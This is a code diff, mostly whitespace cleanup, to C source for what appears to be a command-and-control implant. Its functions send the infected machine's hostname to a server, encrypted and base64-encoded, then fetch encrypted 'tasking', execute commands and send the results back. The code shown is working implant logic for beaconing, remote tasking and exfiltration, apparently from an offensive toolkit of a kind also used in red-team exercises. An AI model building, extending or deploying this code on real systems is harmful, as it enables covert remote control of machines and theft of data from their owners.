@@ -38,10 +38,10 @@ void connectTrevor(void)
     unsigned char* endcookie = NULL;
     DEBUG_PRINT("In connectTrevor\n");
     hostname[1023] = '\0';
-    /* NOTE: There's better OS specific functions that you can do 
+    /* NOTE: There's better OS specific functions that you can do
      * instead of this*/
     gethostname(hostname, 256);
-    
+
     if (hostname[0] == 0) {
         memcpy(hostname, "UNKNOWN", strlen("UNKNOWN"));
     }
@@ -54,7 +54,7 @@ void connectTrevor(void)
     sprintf(hostnameString, "magic_hostname=%s", hostname);
     DEBUG_PRINT("HostnameString: %s\n", hostnameString);
     encodedData = calloc(strlen(hostnameString) + 17, 1);
-    if (encodedData == NULL){
+    if (encodedData == NULL) {
         goto cleanup;
     }
     /*Figure out padding*/
@@ -70,38 +70,37 @@ void connectTrevor(void)
         free(encodedData);
         encodedData = NULL;
     }
-    if (outdata == NULL){
+    if (outdata == NULL) {
         goto cleanup;
     }
     DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
     /*Response looks like its always null terminated*/
     encodedData = b64_encode(outdata, outdataLen);
     DEBUG_PRINT("Encoded : %s\n", encodedData);
-    if (encodedData == NULL){
+    if (encodedData == NULL) {
         goto cleanup;
     }
-    
+
     encodedDataWrap
         = b64_encode((unsigned char*)encodedData, strlen(encodedData));
-    if (encodedDataWrap == NULL){
+    if (encodedDataWrap == NULL) {
         goto cleanup;
     }
-    
+
     pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
             + strlen(encodedDataWrap) + 1,
         1);
-    if (pathval == NULL){
+    if (pathval == NULL) {
         goto cleanup;
     }
     sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);
-    
 
     response
         = http_request(1, "GET", SERVER_HOSTNAME, 80, NULL, pathval, NULL, 0);
     if (response == NULL) {
         goto cleanup;
     }
-    /* NOTE: You can ifdef this out if using wininet/libcurl. 
+    /* NOTE: You can ifdef this out if using wininet/libcurl.
      * Pretty much anything that isn't a standard socket */
     cookievalue = (unsigned char*)strstr((char*)response, COOKIE_VALUE);
     if (cookievalue != NULL) {
@@ -119,7 +118,7 @@ void connectTrevor(void)
     } else {
         DEBUG_PRINT("Failed to get cookie\n");
     }
-    
+
 cleanup:
     if (outdata) {
         free(outdata);
@@ -200,7 +199,7 @@ unsigned char* getTasking(void)
     }
 
     DEBUG_PRINT("Decrypted tasking : %s\n", decryptedtasking);
-    
+
 cleanup:
     if (response) {
         free(response);
@@ -241,7 +240,7 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     sprintf(hostnameString, "%s::::%s", hostname, responseData);
     DEBUG_PRINT("HostnameString: %s\n", hostnameString);
     encodedData = calloc(strlen(hostnameString) + 17, 1);
-    if (encodedData == NULL){
+    if (encodedData == NULL) {
         goto cleanup;
     }
     /*Figure out padding*/
@@ -253,18 +252,18 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     DEBUG_PRINT("Set padding\n");
     outdata = encrypt_buffer((unsigned char*)encodedData,
         strlen(hostnameString) + padding, &outdataLen);
-    
+
     if (encodedData) {
         free(encodedData);
         encodedData = NULL;
     }
-    if (outdata == NULL){
+    if (outdata == NULL) {
         goto cleanup;
     }
     DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
     /*Response looks like its always null terminated*/
     encodedData = b64_encode(outdata, outdataLen);
-    if (encodedData == NULL){
+    if (encodedData == NULL) {
         goto cleanup;
     }
     DEBUG_PRINT("Encoded : %s\n", encodedData);
@@ -273,7 +272,7 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
             + strlen(encodedDataWrap) + 1,
         1);
-    if (encodedDataWrap == NULL){
+    if (encodedDataWrap == NULL) {
         goto cleanup;
     }
     sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);
@@ -305,6 +304,8 @@ cleanup:
     }
 }
 
+/* NOTE: This works on windows/linux/and mac, but should really use a windows
+ * specific method for this and if linux/mac do whats here.*/
 unsigned char* doTasking(unsigned char* command, int* outSize)
 {
     FILE* pin = NULL;
